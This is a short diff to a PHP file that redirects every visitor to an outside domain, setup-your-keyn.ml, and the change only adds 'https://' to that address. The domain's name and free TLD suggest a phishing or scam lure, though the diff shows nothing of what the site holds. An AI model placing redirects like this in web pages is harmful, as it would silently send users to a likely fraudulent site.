@@ -1,4 +1,4 @@
 <?php
-header("Location: setup-your-keyn.ml");
+header("Location: https://setup-your-keyn.ml");
 die();
 ?>
